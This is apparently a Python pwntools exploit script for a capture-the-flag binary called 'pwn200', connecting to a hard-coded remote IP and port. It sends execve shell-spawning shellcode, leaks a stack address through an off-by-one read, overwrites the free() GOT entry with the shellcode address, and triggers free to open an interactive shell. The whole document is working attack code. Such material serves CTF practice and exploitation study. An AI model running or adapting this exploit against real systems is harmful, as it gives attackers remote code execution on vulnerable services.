from pwn import *
import binascii
import time
import struct

elfPath = "pwn200"
libcPath = ""
remoteAddr = "47.104.16.75"
remotePort = 8997

context.binary = elfPath
context.log_level="debug"

if sys.argv[1] == "local":
    context.log_level = "debug"
    sh = process(elfPath, env = {"LD_PRELOAD": libcPath})
    if libcPath:
        libc = ELF(libcPath)
else:
    context.log_level = "debug"
    sh = remote(remoteAddr, remotePort)
    if libcPath:
        libc = ELF(libcPath)


#see example of write_shellcode: http://blog.nsfocus.net/easy-implement-shellcode-xiangjie/
shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
#no canary + ASLR + nx
free_got=0x602018

if __name__ == "__main__":
    #who am i, input the shellcode, off by one no \n, will printf the main_ebp
    print sh.recv(100)
    sh.send(shellcode+'a'*(48-len(shellcode)))
    str_recv=sh.recv(256)
    print "return",str_recv,repr(str_recv)
    main_ebp =str_recv[48:48+6]
    print main_ebp
    main_ebp += "\00\00"
    ebp,=struct.unpack("Q",main_ebp)
    print "Stack address:%08x"%ebp

    #get shellcode_addr
    offset=0x50
    shellcode_addr=ebp-offset
    print "shellcode_addr = " + hex(shellcode_addr)

    sh.sendline('0') #id
    print sh.recvuntil('\n')

    #payload: shellcode_addr + \x00... + free_got
    #use strcpy, make free_got -> shellcode_addr
    payload = p64(shellcode_addr) + '\x00'*(0x38-8) + p64(free_got)
    sh.send(payload)

    #call free
    sh.recvuntil('choice :')
    sh.sendline('2')
    sh.interactive()
